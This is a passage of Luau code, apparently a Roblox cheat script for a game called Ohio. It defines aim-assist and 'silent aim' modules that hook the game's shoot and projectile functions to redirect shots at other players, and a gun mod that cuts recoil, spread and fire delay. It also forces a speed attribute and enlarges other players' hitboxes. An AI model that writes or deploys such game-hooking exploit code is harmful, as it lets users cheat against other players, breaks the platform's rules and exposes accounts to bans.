										Default = tbl31.AimAssist.Animation,
										Callback = function(animation)
											tbl31.AimAssist.Animation = animation
										end,
									})

									tbl31.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-prediction-x",
										Name = "Prediction X",
										Min = 0,
										Max = 7,
										Default = tbl31.AimAssist.PredictionX,
										Step = 0.1,
										Callback = function(predictionX)
											tbl31.AimAssist.PredictionX = predictionX
										end,
									})

									tbl31.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-prediction-y",
										Name = "Prediction Y",
										Min = 0,
										Max = 7,
										Default = tbl31.AimAssist.PredictionY,
										Step = 0.1,
										Callback = function(predictionY)
											tbl31.AimAssist.PredictionY = predictionY
										end,
									})

									tbl31.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-range",
										Name = "Range",
										Min = 50,
										Max = 2000,
										Default = tbl31.AimAssist.Range,
										Step = 1,
										Callback = function(range)
											tbl31.AimAssist.Range = range
										end,
									})

									local v51 = tbl31.AimAssist.Module:CreateToggle({
										Id = "ohio-aim-assist-use-fov",
										Name = "Use Fov",
										Default = tbl31.AimAssist.UseFov,
										Callback = function(useFov)
											tbl31.AimAssist.UseFov = useFov
										end,
									})

									tbl31.AimAssist.Module:CreateSlider({
										Id = "ohio-aim-assist-fov",
										Name = "Fov",
										Min = 1,
										Max = 300,
										Default = tbl31.AimAssist.Fov,
										Step = 1,
										Nested = true,
										Parent = v51,
										Callback = function(fov)
											tbl31.AimAssist.Fov = fov
										end,
									})

									tbl31.AimAssist.Module:CreateColorPicker({
										Id = "ohio-aim-assist-fov-color",
										Name = "Color",
										Default = tbl31.AimAssist.FovColor,
										Nested = true,
										Parent = v51,
										Callback = function(fovColor)
											tbl31.AimAssist.FovColor = fovColor
										end,
									})

									local function fn126()
										local tbl34 = {
											Head = { "Head" },
											Body = { "UpperTorso", "LowerTorso", "Torso", "HumanoidRootPart" },
											Arms = { "LeftUpperArm", "RightUpperArm", "LeftLowerArm", "RightLowerArm", "Left Arm", "Right Arm" },
											Legs = { "LeftUpperLeg", "RightUpperLeg", "LeftLowerLeg", "RightLowerLeg", "Left Leg", "Right Leg" },
										}

										local tbl35 = { Head = "Head", Body = "UpperTorso" }

										local tbl36 = {
											Head = NewVector3(1, 1, 1),
											Torso = NewVector3(2, 2, 1),
											UpperTorso = NewVector3(2, 2, 1),
											LowerTorso = NewVector3(2, 2, 1),
											HumanoidRootPart = NewVector3(2, 2, 1),
											["Left Arm"] = NewVector3(1, 2, 1),
											["Right Arm"] = NewVector3(1, 2, 1),
											LeftUpperArm = NewVector3(1, 2, 1),
											RightUpperArm = NewVector3(1, 2, 1),
											LeftLowerArm = NewVector3(1, 2, 1),
											RightLowerArm = NewVector3(1, 2, 1),
											["Left Leg"] = NewVector3(1, 2, 1),
											["Right Leg"] = NewVector3(1, 2, 1),
											LeftUpperLeg = NewVector3(1, 2, 1),
											RightUpperLeg = NewVector3(1, 2, 1),
											LeftLowerLeg = NewVector3(1, 2, 1),
											RightLowerLeg = NewVector3(1, 2, 1),
										}

										local n11 = 0.05
										local n12 = 24
										local v52 = nil

										local tbl37 = {
											Redirecting = false,
											Goal = nil,
											CachedPart = nil,
											ScanAccum = 0,
											ScanConn = nil,
											FovConn = nil,
											InnerShoot = nil,
											GetFn = nil,
											NewProjectileFn = nil,
											OldShoot = nil,
											OldGet = nil,
											OldNewProjectile = nil,
											Hooked = false,
											SelCount = 0,
											BestPart = nil,
											BestAngle = 360,
											PriPart = nil,
											PriAngle = 360,
											FovLastShow = false,
											FovLastX = 0,
											FovLastY = 0,
											FovLastDiam = 0,
										}

										local v53 = nil
										local v54 = nil
										local v55 = nil

										pcall(function()
											local hui = typeof(gethui) == "function" and gethui() or CoreGui
											local ScreenGui = NewInstance("ScreenGui")
											ScreenGui.Name = "\0"
											ScreenGui.IgnoreGuiInset = true
											ScreenGui.ResetOnSpawn = false
											ScreenGui.DisplayOrder = 11
											ScreenGui.Parent = hui
											local Frame = NewInstance("Frame")
											Frame.Name = "\0"
											Frame.BackgroundTransparency = 1
											Frame.AnchorPoint = NewVector2(0.5, 0.5)
											Frame.BorderSizePixel = 0
											Frame.Visible = false
											Frame.Parent = ScreenGui
											local UICorner = NewInstance("UICorner")
											UICorner.CornerRadius = NewUDim(1, 0)
											UICorner.Parent = Frame
											local UIStroke = NewInstance("UIStroke")
											UIStroke.Thickness = thickness
											UIStroke.Transparency = transparency
											UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
											UIStroke.Color = NewColor3(1, 1, 1)
											UIStroke.Parent = Frame
											v53 = ScreenGui
											v54 = Frame
											v55 = UIStroke
										end)

										local function fn127()
											local hitboxes = tbl31.SilentAim.Hitboxes
											local selCount = 0

											if hitboxes.Head then
												v52[7][v52[6] + 1] = "Head"
												selCount = 1
											end

											if hitboxes.Body then
												selCount += 1
												v52[7][v52[6] + selCount] = "Body"
											end

											if hitboxes.Arms then
												selCount += 1
												v52[7][v52[6] + selCount] = "Arms"
											end

											if hitboxes.Legs then
												selCount += 1
												v52[7][v52[6] + selCount] = "Legs"
											end

											tbl37.SelCount = selCount
											return selCount
										end

										local v56

										local function fn128(arg)
											local selCount = tbl37.SelCount
											if not arg or selCount < 1 then
												return 0
											end
											local n13 = 0

											for i = 1, selCount do
												local v57 = tbl34[v52[7][v52[6] + i]]

												if v57 then
													for i2 = 1, #v57 do
														local v58 = FindFirstChild(arg, v57[i2])

														if v58 and IsA(v58, "BasePart") then
															n13 += 1
															v56[7][v56[6] + n13] = v58
															if n12 <= n13 then
																return n13
															end
														end
													end
												end
											end

											return n13
										end

										local function fn129(arg, arg2)
											if not arg then
												return EmptyVector3
											end

											if not arg2 or arg2 <= 0 then
												return arg.Position
											end
											local n13 = arg2 / 200
											local v57 = tbl36[arg.Name] or NewVector3(1, 2, 1)
											local position = arg.Position
											local v58 = NewVector3
											local x = v57.X
											local n14 = (Random() * 2 - 1) * x * n13
											local y = v57.Y
											local z = v57.Z
											return position + v58(n14, (Random() * 2 - 1) * y * n13, (Random() * 2 - 1) * z * n13)
										end

										local function fn130(arg, arg2)
											local silentAim = tbl31.SilentAim
											local v57 = fn129(arg, silentAim.PointScale)
											local magnitude = LocalPlayer:DistanceFromCharacter(v57)

											if not magnitude or magnitude <= 0 then
												magnitude = (v57 - arg2).Magnitude
											end

											return fn121(v57, arg.AssemblyLinearVelocity or arg.Velocity or EmptyVector3, magnitude, silentAim.PredictionX, silentAim.PredictionY)
										end

										local function fn131(arg, arg2, arg3)
											if arg == LocalPlayer or not arg2 or not arg3 or arg3.Health <= 0 then
												return false
											end

											if FindFirstChildOfClass(arg2, "ForceField") or not CheckState(arg) then
												return false
											end

											if tbl31.SilentAim.IgnoreDowned and fn87(arg) then
												return false
											end
											return true
										end

										local function fn132(arg, arg2, arg3)
											if not arg then
												return false
											end

											if arg3 and arg.Name == arg3 then
												return true
											end
											return arg2 == "Body" and (arg.Name == "Torso" or arg.Name == "HumanoidRootPart" or arg.Name == "LowerTorso")
										end

										local function fn133(arg, arg2, arg3, arg4, arg5)
											local character = arg.Character
											if not fn131(arg, character, character and FindFirstChildOfClass(character, "Humanoid")) then
												return
											end
											local v57 = FindFirstChild(character, "HumanoidRootPart")

											if v57 then
												local n13 = v57.Position - arg2

												if n13.Magnitude > 0.001 then
													if arg4 < Acos(Clamp(Dot(arg3, n13.Unit), -1, 1)) * 2 then
														return
													end
												end
											end

											local v58 = tbl37
											local priority = tbl31.SilentAim.Priority
											local v59 = tbl35[priority]

											for i = 1, fn128(character) do
												local v60 = v56[7][v56[6] + i]
												local n13 = v60.Position - arg2

												if n13.Magnitude >= 0.001 then
													local bestAngle = Acos(Clamp(Dot(arg3, n13.Unit), -1, 1)) * 2

													if bestAngle <= arg4 then
														local v61 = v59 and fn132(v60, priority, v59)

														if (bestAngle < v58.BestAngle or v61 and bestAngle < v58.PriAngle) and fn120(arg2, v60.Position, character, arg5) then
															if bestAngle < v58.BestAngle then
																v58.BestAngle = bestAngle
																v58.BestPart = v60
															end

															if v61 and bestAngle < v58.PriAngle then
																v58.PriAngle = bestAngle
																v58.PriPart = v60
															end
														end
													end
												end
											end
										end

										local function fn134()
											local v57 = Camera()
											if not v57 then
												return nil
											end

											if fn127() < 1 then
												return nil
											end
											local v58 = tbl37
											v58.BestPart = nil
											v58.BestAngle = 360
											v58.PriPart = nil
											v58.PriAngle = 360
											local position = v57.CFrame.Position
											local lookVector = v57.CFrame.LookVector
											local v59 = Rad(tbl31.SilentAim.Fov)
											local v60 = fn69()
											local v61 = GetPlayerList()

											for i = 1, #v61 do
												fn133(v61[i], position, lookVector, v59, v60)
											end

											local silentAim = tbl31.SilentAim
											if tbl35[silentAim.Priority] and silentAim.Accuracy >= Random(1, 100) and v58.PriPart then
												return v58.PriPart
											end
											return v58.BestPart
										end

										local function fn135()
											local cachedPart = tbl37.CachedPart

											if not cachedPart or not cachedPart.Parent then
												cachedPart = fn134()
												tbl37.CachedPart = cachedPart
											end

											if not cachedPart then
												return nil
											end
											local position = Camera()
											position = position and position.CFrame.Position
											if typeof(position) ~= "Vector3" then
												return nil
											end
											return fn130(cachedPart, position)
										end

										local function fn136(arg)
											if type(arg) ~= "function" then
												return false
											end
											local v57 = debug.info(arg, "n")
											if v57 == "shootGunCheck" then
												return false
											end

											if v57 == "shoot" then
												return true
											end
											local str3 = tostring(debug.info(arg, "s") or "")
											local n13 = tonumber(debug.info(arg, "l")) or 0
											return str3:find("modules.shoot", 1, true) ~= nil and n13 > 0 and n13 < 100
										end

										local fn137 = nil

										fn137 = function(arg, arg2)
											if arg2 > 3 or type(arg) ~= "function" then
												return nil
											end
											local getupvalue_ = debug.getupvalue or getupvalue
											if type(getupvalue_) ~= "function" then
												return nil
											end

											for i = 1, 16 do
												local ok4, result4 = pcall(getupvalue_, arg, i)
												if not ok4 then
													break
												end

												if fn136(result4) then
													return result4
												end
											end

											for i = 1, 16 do
												local ok4, result4 = pcall(getupvalue_, arg, i)
												if not ok4 then
													break
												end

												if type(result4) ~= "function" then
													continue
												end
												local v57 = fn137(result4, arg2 + 1)
												if v57 then
													return v57
												end
											end

											return nil
										end

										local function fn138()
											if type(tbl37.InnerShoot) == "function" then
												return tbl37.InnerShoot
											end
											local ok4, innerShoot = pcall(require, ReplicatedStorage.devv.client.Objects.v3item.bin.Gun.modules.controller.modules.shoot)

											if ok4 and type(innerShoot) == "function" then
												if fn136(innerShoot) then
													tbl37.InnerShoot = innerShoot
													return innerShoot
												end
												local v57 = fn137(innerShoot, 0)
												if v57 then
													tbl37.InnerShoot = v57
													return v57
												end
											end

											if typeof(getgc) == "function" then
												for _, v57 in pairs(getgc(false)) do
													if fn136(v57) then
														tbl37.InnerShoot = v57
														return v57
													end
												end
											end

											return nil
										end

										local function fn139(arg)
											local goal = tbl37.Goal
											if type(arg) ~= "table" or typeof(goal) ~= "Vector3" then
												return
											end

											if typeof(arg.cframe) == "CFrame" then
												local position = arg.cframe.Position

												if (goal - position).Magnitude > 0.001 then
													arg.cframe = NewCFrame(position, goal)
												end
											end

											if typeof(arg.visualCFrame) == "CFrame" then
												local position = arg.visualCFrame.Position

												if (goal - position).Magnitude > 0.001 then
													arg.visualCFrame = NewCFrame(position, goal)
												end
											end
										end

										local function fn140(arg)
											if type(arg) == "function" and typeof(isfunctionhooked) == "function" and isfunctionhooked(arg) then
												pcall(restorefunction, arg)
											end
										end

										local function fn141(arg, arg2, ...)
											if tbl37.Redirecting and arg == LocalPlayer and arg2 == "aimPoint" then
												local goal = tbl37.Goal
												if typeof(goal) == "Vector3" then
													return goal
												end
											end

											local oldGet = tbl37.OldGet
											local v57 = table.pack(...)
											v57.n = 3 + v57.n - 1
											table.move(v57, 1, v57.n, 3, v57)
											v57[1] = arg
											v57[2] = arg2
											return oldGet(table.unpack(v57, 1, v57.n))
										end

										local function fn142(arg, arg2, ...)
											if tbl37.Redirecting then
												if type(arg) == "table" then
													fn139(arg)
												end

												if type(arg2) == "table" then
													fn139(arg2)
												end
											end

											local oldNewProjectile = tbl37.OldNewProjectile
											local v57 = table.pack(...)
											v57.n = 3 + v57.n - 1
											table.move(v57, 1, v57.n, 3, v57)
											v57[1] = arg
											v57[2] = arg2
											return oldNewProjectile(table.unpack(v57, 1, v57.n))
										end

										local function fn143(...)
											local silentAim = tbl31.SilentAim
											local flag4 = not silentAim.Enabled

											if not flag4 then
												local hitChance = silentAim.HitChance
												flag4 = Random(1, 100) > hitChance
											end

											if flag4 then
												return tbl37.OldShoot(...)
											end
											local v57 = fn135()
											if typeof(v57) ~= "Vector3" then
												return tbl37.OldShoot(...)
											end
											tbl37.Goal = v57
											tbl37.Redirecting = true
											local ok4, result4 = pcall(tbl37.OldShoot, ...)
											tbl37.Redirecting = false
											tbl37.Goal = nil

											if not ok4 then
												warn(result4)
											end
										end

										local function fn144(innerShoot, newProjectileFn)
											tbl37.InnerShoot = innerShoot
											tbl37.GetFn = ClientReplicator.Get
											tbl37.NewProjectileFn = newProjectileFn
											tbl37.OldGet = hookfunction(ClientReplicator.Get, fn141)

											if type(newProjectileFn) == "function" then
												tbl37.OldNewProjectile = hookfunction(newProjectileFn, fn142)
											end

											tbl37.OldShoot = hookfunction(innerShoot, fn143)
											tbl37.Hooked = true
										end

										local function fn145()
											if tbl37.FovConn then
												Disconnect(tbl37.FovConn)
												tbl37.FovConn = nil
											end

											if v54 and v54.Visible then
												v54.Visible = false
											end

											tbl37.FovLastShow = false
										end

										local function fn146()
											fn145()
											if not v54 or not v55 then
												return
											end

											local function fn147()
												local v57 = tbl37
												local silentAim = tbl31.SilentAim
												local v58 = Camera()
												local fovLastShow = (silentAim.Module == nil or silentAim.Module:Get() == true) and silentAim.VisualizeFov == true and v58 ~= nil

												if v57.FovLastShow ~= fovLastShow then
													v57.FovLastShow = fovLastShow
													v54.Visible = fovLastShow
												end

												if not fovLastShow then
													return
												end
												local v59, v60 = fn114(v58)
												local v61 = Max(2, Floor(fn115(v58, silentAim.Fov) * 2 + 0.5))

												if v55.Color ~= White then
													v55.Color = White
													v55.Transparency = transparency
												end

												if v57.FovLastX ~= v59 or v57.FovLastY ~= v60 then
													v57.FovLastX = v59
													v57.FovLastY = v60
													v54.Position = NewUDim2(0, v59, 0, v60)
												end

												if v57.FovLastDiam ~= v61 then
													v57.FovLastDiam = v61
													v54.Size = NewUDim2(0, v61, 0, v61)
												end
											end

											fn147()
											tbl37.FovConn = Connect(RunService.RenderStepped, fn147)
										end

										local function fn147()
											if tbl37.ScanConn then
												Disconnect(tbl37.ScanConn)
												tbl37.ScanConn = nil
											end

											fn145()
											fn140(tbl37.InnerShoot)
											fn140(tbl37.GetFn)
											fn140(tbl37.NewProjectileFn)
											tbl37.Redirecting = false
											tbl37.Goal = nil
											tbl37.CachedPart = nil
											tbl37.ScanAccum = 0
											tbl37.OldShoot = nil
											tbl37.OldGet = nil
											tbl37.OldNewProjectile = nil
											tbl37.Hooked = false
											tbl31.SilentAim.Enabled = false
										end

										local function fn148()
											fn147()
											tbl31.SilentAim.Enabled = true
											local v57 = fn138()

											if not v57 then
												fn7("Silent Aim", "Failed to hook shoot", 4)
												tbl31.SilentAim.Enabled = false
												return
											end

											local projectiles = v3item.projectiles
											fn144(v57, projectiles and projectiles.newProjectileOfType)

											tbl37.ScanConn = Connect(RunService.Heartbeat, function(arg)
												if not tbl31.SilentAim.Enabled then
													fn147()
													return
												end
												tbl37.ScanAccum = tbl37.ScanAccum + arg
												if tbl37.ScanAccum < n11 then
													return
												end
												tbl37.ScanAccum = 0
												tbl37.CachedPart = fn134()
											end)

											if tbl31.SilentAim.VisualizeFov then
												fn146()
											end
										end

										tbl31.SilentAim.Module = v35:CreateModule({
											Id = "ohio-silent-aim",
											Name = "Silent Aim",
											Default = false,
											Callback = function(arg)
												if arg then
													fn148()
												else
													fn147()
												end
											end,
										})

										tbl31.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-fov",
											Name = "Maximum FOV",
											Min = 0,
											Max = 90,
											Default = tbl31.SilentAim.Fov,
											Step = 0.1,
											Callback = function(fov)
												tbl31.SilentAim.Fov = fov
											end,
										})

										tbl31.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-hit-chance",
											Name = "Hit Chance",
											Min = 0,
											Max = 100,
											Default = tbl31.SilentAim.HitChance,
											Step = 1,
											Callback = function(hitChance)
												tbl31.SilentAim.HitChance = hitChance
											end,
										})

										tbl31.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-accuracy",
											Name = "Accuracy",
											Min = 0,
											Max = 100,
											Default = tbl31.SilentAim.Accuracy,
											Step = 1,
											Callback = function(accuracy)
												tbl31.SilentAim.Accuracy = accuracy
											end,
										})

										tbl31.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-point-scale",
											Name = "Point Scale",
											Min = 0,
											Max = 100,
											Default = tbl31.SilentAim.PointScale,
											Step = 1,
											Callback = function(pointScale)
												tbl31.SilentAim.PointScale = pointScale
											end,
										})

										tbl31.SilentAim.Module:CreateSelector({
											Id = "ohio-silent-aim-priority",
											Name = "Hitscan Priority",
											Options = { { Value = "Closest" }, { Value = "Head" }, { Value = "Body" } },
											Default = tbl31.SilentAim.Priority,
											Callback = function(priority)
												tbl31.SilentAim.Priority = priority
											end,
										})

										tbl31.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-hitbox-head",
											Name = "Head",
											Default = tbl31.SilentAim.Hitboxes.Head,
											Callback = function(arg)
												tbl31.SilentAim.Hitboxes.Head = arg == true
											end,
										})

										tbl31.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-hitbox-body",
											Name = "Body",
											Default = tbl31.SilentAim.Hitboxes.Body,
											Callback = function(arg)
												tbl31.SilentAim.Hitboxes.Body = arg == true
											end,
										})

										tbl31.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-hitbox-arms",
											Name = "Arms",
											Default = tbl31.SilentAim.Hitboxes.Arms,
											Callback = function(arg)
												tbl31.SilentAim.Hitboxes.Arms = arg == true
											end,
										})

										tbl31.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-hitbox-legs",
											Name = "Legs",
											Default = tbl31.SilentAim.Hitboxes.Legs,
											Callback = function(arg)
												tbl31.SilentAim.Hitboxes.Legs = arg == true
											end,
										})

										tbl31.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-prediction-x",
											Name = "Prediction X",
											Min = 0,
											Max = 7,
											Default = tbl31.SilentAim.PredictionX,
											Step = 0.01,
											Callback = function(predictionX)
												tbl31.SilentAim.PredictionX = predictionX
											end,
										})

										tbl31.SilentAim.Module:CreateSlider({
											Id = "ohio-silent-aim-prediction-y",
											Name = "Prediction Y",
											Min = 0,
											Max = 7,
											Default = tbl31.SilentAim.PredictionY,
											Step = 0.01,
											Callback = function(predictionY)
												tbl31.SilentAim.PredictionY = predictionY
											end,
										})

										tbl31.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-visualize-fov",
											Name = "Visualize FOV",
											Default = tbl31.SilentAim.VisualizeFov,
											Callback = function(arg)
												tbl31.SilentAim.VisualizeFov = arg == true

												if tbl31.SilentAim.Enabled and arg then
													fn146()
												else
													fn145()
												end
											end,
										})

										tbl31.SilentAim.Module:CreateToggle({
											Id = "ohio-silent-aim-ignore-downed",
											Name = "Ignore Downed",
											Default = tbl31.SilentAim.IgnoreDowned,
											Callback = function(arg)
												tbl31.SilentAim.IgnoreDowned = arg == true
											end,
										})
									end

									fn126()
									local tbl34 = { "recoilAdd", "maxRecoil", "muzzleClimbFactor", "muzzleSwayFactor" }
									local tbl35 = { "horizRecoil", "vertRecoil", "recoilAngle" }
									local tbl36 = { "baseSpread", "baseAimSpread", "spread", "aimSpread" }
									local tbl37 = { "projectileLength" }
									local tbl38 = { "projectileLifetime" }
									local tbl39 = { "fireDebounce" }
									local tbl40 = {}
									local flag4 = false

									local function fn127(arg)
										return type(arg) == "table" and type(arg.name) == "string" and (type(arg.recoilAdd) == "number" or type(arg.spread) == "number" or type(arg.projectileLength) == "number" or type(arg.fireDebounce) == "number")
									end

									local function fn128(arg)
										local name2 = arg and arg.name
										if type(name2) ~= "string" then
											return nil
										end

										if tbl40[name2] then
											return tbl40[name2]
										end
										local tbl41 = { keys = {}, fps = {} }

										for i = 1, #tbl34 do
											local v52 = tbl34[i]

											if type(arg[v52]) == "number" then
												tbl41.keys[v52] = arg[v52]
											end
										end

										for i = 1, #tbl36 do
											local v52 = tbl36[i]

											if type(arg[v52]) == "number" then
												tbl41.keys[v52] = arg[v52]
											end
										end

										for i = 1, #tbl37 do
											local v52 = tbl37[i]

											if type(arg[v52]) == "number" then
												tbl41.keys[v52] = arg[v52]
											end
										end

										for i = 1, #tbl38 do
											local v52 = tbl38[i]

											if type(arg[v52]) == "number" then
												tbl41.keys[v52] = arg[v52]
											end
										end

										for i = 1, #tbl39 do
											local v52 = tbl39[i]

											if type(arg[v52]) == "number" then
												tbl41.keys[v52] = arg[v52]
											end
										end

										local fpsOffsets = arg.FPSOffsets

										if type(fpsOffsets) == "table" then
											for i = 1, #tbl35 do
												local v52 = tbl35[i]

												if type(fpsOffsets[v52]) == "number" then
													tbl41.fps[v52] = fpsOffsets[v52]
												end
											end
										end

										tbl40[name2] = tbl41
										return tbl41
									end

									local function fn129()
										if flag4 then
											return
										end

										for _, v52 in pairs(tbl14) do
											if typeof(v52) == "Instance" then
												local ok4, result4 = pcall(require, v52)

												if ok4 and fn127(result4) then
													fn128(result4)
												end
											end
										end

										flag4 = true
									end

									local function fn130(arg, arg2, arg3, arg4, arg5, arg6)
										local v52 = fn128(arg)
										if not v52 then
											return
										end

										for i = 1, #tbl34 do
											local v53 = tbl34[i]

											if v52.keys[v53] ~= nil then
												arg[v53] = v52.keys[v53] * arg2
											end
										end

										for i = 1, #tbl36 do
											local v53 = tbl36[i]

											if v52.keys[v53] ~= nil then
												arg[v53] = v52.keys[v53] * arg3
											end
										end

										for i = 1, #tbl37 do
											local v53 = tbl37[i]

											if v52.keys[v53] ~= nil then
												arg[v53] = v52.keys[v53] * arg4
											end
										end

										for i = 1, #tbl38 do
											local v53 = tbl38[i]

											if v52.keys[v53] ~= nil then
												arg[v53] = v52.keys[v53] * arg5
											end
										end

										for i = 1, #tbl39 do
											local v53 = tbl39[i]

											if v52.keys[v53] ~= nil then
												arg[v53] = v52.keys[v53] * arg6
											end
										end

										local fpsOffsets = arg.FPSOffsets

										if type(fpsOffsets) == "table" then
											for i = 1, #tbl35 do
												local v53 = tbl35[i]

												if v52.fps[v53] ~= nil then
													fpsOffsets[v53] = v52.fps[v53] * arg2
												end
											end
										end
									end

									local function fn131(arg)
										local v52 = tbl40[arg.name]
										if not v52 then
											return
										end

										for k, key in pairs(v52.keys) do
											arg[k] = key
										end

										local fpsOffsets = arg.FPSOffsets

										if type(fpsOffsets) == "table" then
											for k, v53 in pairs(v52.fps) do
												fpsOffsets[k] = v53
											end
										end
									end

									local function fn132(arg)
										for _, v52 in pairs(tbl14) do
											if typeof(v52) == "Instance" then
												local ok4, result4 = pcall(require, v52)

												if ok4 and fn127(result4) then
													arg(result4)
												end
											end
										end

										local v52 = pairs
										local items = inventory.items or {}

										for _, item in v52(items) do
											if fn127(item) then
												arg(item)
											end
										end
									end

									local function fn133()
										fn129()
										if not tbl31.GunMod.Enabled then
											fn132(fn131)
											return
										end
										local n11 = tbl31.GunMod.Recoil / 100
										local n12 = tbl31.GunMod.Spread / 100
										local bulletSpeed = tbl31.GunMod.BulletSpeed
										local bulletLifetime = tbl31.GunMod.BulletLifetime
										local n13 = tbl31.GunMod.FireDebounce / 100

										fn132(function(arg)
											fn130(arg, n11, n12, bulletSpeed, bulletLifetime, n13)
										end)
									end

									fn94 = function()
										if tbl31.GunMod.Enabled then
											fn133()
										end
									end

									pcall(function()
										Connect(inventory.onItemAdded, function()
											if tbl31.GunMod.Enabled then
												fn133()
											end
										end)
									end)

									local v52 = v35:CreateModule({
										Id = "ohio-gun-mod",
										Name = "Gun Mod",
										Default = false,
										Callback = function(arg)
											tbl31.GunMod.Enabled = arg == true
											fn133()
										end,
									})

									v52:CreateSlider({
										Id = "ohio-gun-mod-recoil",
										Name = "Recoil",
										Min = 0,
										Max = 100,
										Default = tbl31.GunMod.Recoil,
										Step = 1,
										Callback = function(recoil)
											tbl31.GunMod.Recoil = recoil

											if tbl31.GunMod.Enabled then
												fn133()
											end
										end,
									})

									v52:CreateSlider({
										Id = "ohio-gun-mod-spread",
										Name = "Spread",
										Min = 0,
										Max = 100,
										Default = tbl31.GunMod.Spread,
										Step = 1,
										Callback = function(spread)
											tbl31.GunMod.Spread = spread

											if tbl31.GunMod.Enabled then
												fn133()
											end
										end,
									})

									v52:CreateSlider({
										Id = "ohio-gun-mod-fire-debounce",
										Name = "Fire Debounce",
										Min = 0,
										Max = 100,
										Default = tbl31.GunMod.FireDebounce,
										Step = 1,
										Callback = function(fireDebounce)
											tbl31.GunMod.FireDebounce = fireDebounce

											if tbl31.GunMod.Enabled then
												fn133()
											end
										end,
									})

									v52:CreateSlider({
										Id = "ohio-gun-mod-bullet-speed",
										Name = "Bullet Speed",
										Min = 0.1,
										Max = 100,
										Default = tbl31.GunMod.BulletSpeed,
										Step = 0.1,
										Callback = function(bulletSpeed)
											tbl31.GunMod.BulletSpeed = bulletSpeed

											if tbl31.GunMod.Enabled then
												fn133()
											end
										end,
									})

									v52:CreateSlider({
										Id = "ohio-gun-mod-bullet-lifetime",
										Name = "Bullet Lifetime",
										Min = 0.1,
										Max = 10,
										Default = tbl31.GunMod.BulletLifetime,
										Step = 0.1,
										Callback = function(bulletLifetime)
											tbl31.GunMod.BulletLifetime = bulletLifetime

											if tbl31.GunMod.Enabled then
												fn133()
											end
										end,
									})

									local v53 = nil

									v35:CreateModule({
										Id = "ohio-legit-inf-coffee",
										Name = "Inf Coffee",
										Default = true,
										Callback = function(arg)
											v53 = arg

											if arg then
												SetAttribute(LocalPlayer, "speedModifier", 6)
											end
										end,
									})

									LocalPlayer:GetAttributeChangedSignal("speedModifier", function()
										if not v53 then
											return
										end
										local v54 = GetAttribute(LocalPlayer, "speedModifier")

										if v54 and v54 < 6 then
											SetAttribute(LocalPlayer, "speedModifier", 6)
										end
									end)
								end

								fn111()
								local v36 = v14:CreateTab({ Id = "ohio-rage", Name = "Ohio Rage" })

								local function fn112()
									local tbl31 = {
										Hitbox = {
											Enabled = false,
											Size = 15,
											Color = NewColor3(1, 1, 1),
											Transparency = 0.95,
											Part = "Body",
											HitChance = 100,
										},
										MeleeAura = { Enabled = false, Vehicles = false },
										BreakVest = false,
										StompAuraModule = nil,
										GrabAuraModule = nil,
										GrabAuraDrop = false,
										HandcuffAuraModule = nil,
										AutoVest = { Module = nil, Vest = "Light Vest" },
										AutoHealModule = nil,
										Ragebot = { Module = nil, Nextbot = false },
										RPG_TridentAll = { Enabled = false, Delay = 1 },
										Flame_AcidKillNearest = false,
										SprayNearest = false,
									}

									OhioRageState = tbl31
									local tbl32 = {}
									local v37 = NewVector3(0, 0, 0)

									local function fn113(arg, arg2)
										local hitbox = tbl31.Hitbox

										if tbl32[arg2] == nil then
											tbl32[arg2] = arg.Color
										end

										local size = hitbox.Size

										if v37.X ~= size or v37.Y ~= size or v37.Z ~= size then
											v37 = NewVector3(size, size, size)
										end

										if arg.Size ~= v37 then
											arg.Size = v37
										end

										if arg.Color ~= hitbox.Color then
											arg.Color = hitbox.Color
										end

										if arg.Transparency ~= hitbox.Transparency then
											arg.Transparency = hitbox.Transparency
										end

										if arg.CanCollide then
											arg.CanCollide = false
										end
									end

									local function fn114(arg)
										if arg == LocalPlayer then
											return
										end
										local character = arg.Character
										if not character or not character.Parent then
											return
										end

										if GetAttribute(arg, "isSpawned") ~= true then
											return
										end
										local v38 = FindFirstChild(character, "HumanoidRootPart")
										local v39 = FindFirstChildOfClass(character, "Humanoid")
										if not v38 or not v39 or v39.Health <= 0 then
											return
										end

										if FindFirstChildOfClass(character, "ForceField") then
											return
										end

										if not CheckState(arg) then
											return
										end
										fn113(v38, character)
									end

									local function fn115()
										if not (tbl31.Hitbox.Module and tbl31.Hitbox.Module:Get()) then
											return
										end
										local v38 = GetPlayerList()

										for i = 1, #v38 do
											pcall(fn114, v38[i])
										end
									end

									local function fn116()
										local v38 = GetPlayerList()

										for i = 1, #v38 do
											local v39 = v38[i]

											if v39 ~= LocalPlayer then
												local character = v39.Character
												local v40 = character and FindFirstChild(character, "HumanoidRootPart")

												if v40 then
													if tbl32[character] then
														v40.Color = tbl32[character]
														tbl32[character] = nil
													end

													v40.Size = NewVector3(2, 2, 1)
													v40.Transparency = 1
													v40.CanCollide = true
												end
											end
										end
									end

									local v38 = nil

									local function fn117()
										pcall(task.cancel, v38)
										v38 = nil
									end

									local function fn118()
										fn117()
										if not tbl31.Hitbox.Module then
											return
										end

										v38 = Spawn(function()
											while tbl31.Hitbox.Module and tbl31.Hitbox.Module:Get() do
												Wait(0.5)

												for k in pairs(tbl32) do
													if not k or not k.Parent then
														tbl32[k] = nil
													end
												end

												fn115()
											end
										end)
									end

									Connect(Players.PlayerAdded, function(arg)
										if arg == LocalPlayer then
											return
										end

										Connect(arg.CharacterAdded, function()
											if tbl31.Hitbox.Module and tbl31.Hitbox.Module:Get() then
												fn114(arg)
											end
										end)
									end)

									local function fn119()
